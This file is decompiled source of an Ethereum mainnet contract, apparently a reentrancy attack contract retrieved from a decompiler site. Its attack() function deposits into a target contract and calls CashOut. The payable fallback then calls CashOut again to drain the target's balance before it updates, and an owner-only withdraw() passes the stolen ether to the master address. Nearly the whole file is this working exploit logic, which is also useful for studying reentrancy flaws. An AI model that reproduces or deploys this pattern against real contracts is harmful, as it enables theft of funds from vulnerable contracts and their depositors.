# contract source code retrieved from eveem.org
# retrieved on 2019-12-03

#  addr = 0xF2DBD39895260fcBee724c0909584E62114d6847 
#  network = mainnet 
#  ver = 26 Apr 2019 
#  problems = {} 

# storage definitions
def storage:
    # storage address 0
    masterAddress # mask: a s
    # storage address 1
    unknown85295877Address # mask: a s
    # storage address 2
    stor2 # mask: a s
# hash = 0x3ccfd60b
# getter = None
# const = None
# payable = False
def withdraw(): # not payable
  require masterAddress == caller
  call caller with:
     value eth.balance(this.address) wei
       gas 2300 * is_zero(value) wei
  require ext_call.success


# hash = 0x85295877
# getter = ['storage', 160, 0, 1]
# const = None
# payable = False
def unknown85295877(): # not payable
  return unknown85295877Address


# hash = 0x9e5faafc
# getter = None
# const = None
# payable = True
def attack() payable: 
  require masterAddress == caller
  require ext_code.size(unknown85295877Address)
  call unknown85295877Address.Deposit() with:
     value eth.balance(unknown85295877Address) wei
       gas gas_remaining - 9710 wei
  require ext_call.success
  require ext_code.size(unknown85295877Address)
  call unknown85295877Address.CashOut(uint256 amount) with:
       gas gas_remaining - 710 wei
      args eth.balance(unknown85295877Address)
  require ext_call.success
  require eth.balance(this.address) >= eth.balance(this.address)


# hash = 0xee97f7f3
# getter = ['storage', 160, 0, 0]
# const = None
# payable = False
def master(): # not payable
  return masterAddress


# hash = _fallback()
# getter = None
# const = None
# payable = True
def _fallback() payable: # default function
  if stor2 <= 1:
      stor2++
      require ext_code.size(unknown85295877Address)
      call unknown85295877Address.CashOut(uint256 amount) with:
           gas gas_remaining - 710 wei
          args call.value
      require ext_call.success


